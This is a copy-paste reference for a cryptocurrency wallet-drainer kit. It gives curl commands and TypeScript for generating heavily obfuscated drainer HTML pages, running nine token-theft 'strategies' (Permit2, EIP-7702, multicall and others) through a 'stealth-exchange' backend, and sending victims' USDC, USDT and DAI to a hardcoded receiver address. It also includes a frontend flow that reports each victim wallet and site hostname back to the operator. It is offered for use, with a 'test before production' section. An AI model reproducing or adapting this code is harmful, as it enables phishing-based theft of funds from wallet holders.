# Quick Copy-Paste Examples

Ready-to-use code snippets for common interactions.

---

## 1. Generate Drainer Script (Backend)

```bash
#!/bin/bash
TOKEN="your_session_token_here"

# Generate HTML page with drainer script
curl -X POST http://localhost:3001/api/script/generate-drainer \
  -H "Cookie: s26_session=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "format": "html",
    "obfuscation": "heavy",
    "receiver": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "backend": "/api/submit-drainer"
  }' | jq '.script' > drainer-page.html

# Open in browser
open drainer-page.html
```

---

## 2. Execute Strategy (Permit2)

```bash
TOKEN="your_session_token"

curl -X POST http://localhost:3001/api/action/execute \
  -H "Cookie: s26_session=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "mode": "permit2",
    "backend": "stealth-exchange",
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "recipient": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "chainId": 1,
    "tokens": ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"],
    "amounts": ["1000000000"]
  }' | jq '.calldata'
```

**Get calldata** → send to wallet → blockchain executes

---

## 3. Try All 9 Strategies

```bash
TOKEN="your_session_token"
WALLET="0x742d35Cc6634C0532925a3b844Bc9e7595f42bE"
RECIPIENT="0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693"

for STRATEGY in direct approve permit permit2 multicall eip712 eip7702 gasless trails; do
  echo "Testing: $STRATEGY"
  
  curl -s -X POST http://localhost:3001/api/action/execute \
    -H "Cookie: s26_session=$TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
      \"mode\": \"$STRATEGY\",
      \"backend\": \"stealth-exchange\",
      \"wallet\": \"$WALLET\",
      \"recipient\": \"$RECIPIENT\",
      \"chainId\": 1
    }" | jq '{mode: .mode, status: .status, target: .target}'
  
  echo ""
done
```

---

## 4. Create Session with Limits (TypeScript)

```typescript
import { ethers } from 'ethers';
import Redis from 'ioredis';

const redis = new Redis();
const SESSION_MANAGER_ADDRESS = '0x4AE428352317752a51Ac022C9D2551BcDef785cb';

async function createSessionWithLimits(
  wallet: string,
  receiver: string,
  tokens: string[],
  maxAmount: string,
  durationSeconds: number
): Promise<string> {
  // Generate session key
  const sessionKey = ethers.keccak256(
    ethers.solidityPacked(
      ['address', 'address', 'uint256'],
      [wallet, receiver, Date.now()]
    )
  );

  // Store session config in Redis
  const sessionConfig = {
    wallet,
    receiver,
    allowedTokens: tokens,
    maxAmount,
    maxAmountUsed: '0',
    createdAt: Date.now(),
    expiresAt: Date.now() + durationSeconds * 1000,
  };

  await redis.set(
    `session:${sessionKey}`,
    JSON.stringify(sessionConfig),
    'EX',
    durationSeconds
  );

  console.log(`✅ Session created: ${sessionKey}`);
  console.log(`   Max amount: ${ethers.formatUnits(maxAmount, 6)} USDC`);
  console.log(`   Duration: ${durationSeconds}s`);

  return sessionKey;
}

// Usage
const sessionKey = await createSessionWithLimits(
  '0x742d35Cc6634C0532925a3b844Bc9e7595f42bE',
  '0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693',
  ['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'], // USDC only
  ethers.parseUnits('10000', 6), // 10,000 USDC
  86400 // 24 hours
);
```

---

## 5. Execute Strategy with Session

```typescript
async function executeWithSession(
  mode: string,
  wallet: string,
  receiver: string,
  sessionKey: string
): Promise<{ calldata: string; target: string }> {
  const response = await fetch('/api/action/execute', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      mode,
      backend: 'stealth-exchange',
      wallet,
      recipient: receiver,
      chainId: 1,
      sessionKey, // Add session constraint
    }),
  });

  if (!response.ok) {
    const error = await response.json();
    throw new Error(error.message);
  }

  return await response.json();
}

// Usage
const plan = await executeWithSession(
  'permit2',
  '0x742d35Cc6634C0532925a3b844Bc9e7595f42bE',
  '0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693',
  sessionKey
);

console.log('📋 Calldata:', plan.calldata);
console.log('🎯 Target:', plan.target);
```

---

## 6. Track Session Usage

```typescript
import Redis from 'ioredis';

const redis = new Redis();

async function trackSessionUsage(sessionKey: string, amountUsed: string) {
  const session = await redis.get(`session:${sessionKey}`);
  
  if (!session) {
    throw new Error('Session expired');
  }

  const config = JSON.parse(session);
  const newUsage = (
    BigInt(config.maxAmountUsed) + BigInt(amountUsed)
  ).toString();

  // Check if exceeds limit
  if (BigInt(newUsage) > BigInt(config.maxAmount)) {
    throw new Error(
      `Session limit exceeded: ${newUsage} > ${config.maxAmount}`
    );
  }

  // Update session
  config.maxAmountUsed = newUsage;
  await redis.set(
    `session:${sessionKey}`,
    JSON.stringify(config)
  );

  return {
    used: newUsage,
    remaining: (BigInt(config.maxAmount) - BigInt(newUsage)).toString(),
    percentUsed: (
      (BigInt(newUsage) * BigInt(100)) / BigInt(config.maxAmount)
    ).toString(),
  };
}

// Usage
const usage = await trackSessionUsage(
  sessionKey,
  ethers.parseUnits('1000', 6) // 1000 USDC
);

console.log(`✅ Tracked: ${ethers.formatUnits(usage.used, 6)} USDC used`);
console.log(`📊 Remaining: ${ethers.formatUnits(usage.remaining, 6)} USDC`);
console.log(`📈 Usage: ${usage.percentUsed}%`);
```

---

## 7. Frontend: Send Transaction

```typescript
import { ethers } from 'ethers';

async function sendTransactionWithCalldata(
  calldata: string,
  target: string
): Promise<string> {
  // Get signer from wallet
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();

  // Send transaction
  const tx = await signer.sendTransaction({
    to: target,
    data: calldata,
    value: '0',
  });

  console.log('⏳ Waiting for confirmation...');
  const receipt = await tx.wait();

  console.log('✅ Transaction confirmed:', receipt?.hash);
  return receipt?.hash || '';
}

// Usage
const txHash = await sendTransactionWithCalldata(
  plan.calldata,
  plan.target
);

console.log(`🎉 Success: ${txHash}`);
```

---

## 8. Complete Drainer to Execution Flow

```typescript
// Backend handler for drainer submission

async function handleDrainerWallet(wallet: string, receiver: string) {
  console.log(`📥 Drainer connection: ${wallet}`);

  // Step 1: Create session with limits
  const sessionKey = await createSessionWithLimits(
    wallet,
    receiver,
    ['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', 
     '0xdAC17F958D2ee523a2206206994597C13D831ec7'],
    ethers.parseUnits('10000', 6),
    86400
  );

  // Step 2: Generate strategy calldata
  const plan = await fetch('/api/action/execute', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      mode: 'permit2',
      backend: 'stealth-exchange',
      wallet,
      recipient: receiver,
      chainId: 1,
      sessionKey,
    }),
  }).then(r => r.json());

  // Step 3: Return to frontend
  return {
    status: 'ready',
    plan,
    sessionKey,
    message: `Execute ${plan.mode} with ${sessionKey}`,
  };
}

// Frontend: Handle response
const result = await fetch('/api/submit-drainer', {
  method: 'POST',
  body: JSON.stringify({ wallet, receiver, site: location.hostname }),
}).then(r => r.json());

// Execute the plan
const txHash = await sendTransactionWithCalldata(
  result.plan.calldata,
  result.plan.target
);

// Track usage
const usage = await trackSessionUsage(result.sessionKey, amountUsed);
console.log(`💰 Spent: ${usage.percentUsed}% of session limit`);
```

---

## 9. Check All Available Contracts

```bash
TOKEN="your_session_token"

curl -X GET http://localhost:3001/api/compile \
  -H "Cookie: s26_session=$TOKEN" \
  -H "Content-Type: application/json" \
  | jq '.config.contracts | length'

# Shows total contracts available
# Then filter for specific ones:

curl -X GET http://localhost:3001/api/compile \
  -H "Cookie: s26_session=$TOKEN" \
  | jq '.config.contracts[] | select(.id | contains("session")) | {id, address}'
```

---

## 10. Test Before Production

```bash
# 1. Test drainer script generation
echo "✅ Test 1: Drainer Script"
curl -s -X POST http://localhost:3001/api/script/generate-drainer \
  -H "Cookie: s26_session=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"obfuscation": "none"}' | jq '.status'

# 2. Test permit2 strategy
echo "✅ Test 2: Permit2 Strategy"
curl -s -X POST http://localhost:3001/api/action/execute \
  -H "Cookie: s26_session=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"mode": "permit2", "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE", "recipient": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693", "chainId": 1}' \
  | jq '.status'

# 3. Test eip7702 strategy
echo "✅ Test 3: EIP-7702 Strategy"
curl -s -X POST http://localhost:3001/api/action/execute \
  -H "Cookie: s26_session=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"mode": "eip7702", "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE", "recipient": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693", "chainId": 1}' \
  | jq '.status'

# All should return "success" or "ok"
```

---

## Common Addresses (Hardcoded)

```typescript
// Copy into your code
const ADDRESSES = {
  sessionManager: '0x4AE428352317752a51Ac022C9D2551BcDef785cb',
  permit2Executor: '0x4593D97d6E932648fb4425aC2945adaF66927773',
  erc2612Executor: '0xb8eF065061bbBF5dCc65083be8CC7B50121AE900',
  batchMulticall: '0xF93E987DF029e95CdE59c0F5cD447e0a7002054D',
  eip7702BatchDelegate: '0xb61cA663d438900d086359e0bB7aA4140091053C',
  stealthExchange: '0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A',
  
  // Test tokens
  usdc: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
  usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  dai: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
};
```

---

## Troubleshooting

```bash
# 1. Session not found
# → Session expired - create new one

# 2. Strategy not supported
# → Check spelling: direct, approve, permit, permit2, multicall, eip712, eip7702, gasless, trails

# 3. Token not in allowed list
# → Update session with correct token addresses

# 4. Session limit exceeded
# → Wait for session to expire or create new one

# 5. Calldata execution reverts
# → Check wallet has tokens, approvals set, gas sufficient
```

---

That's it! Copy any example above and customize with your addresses.
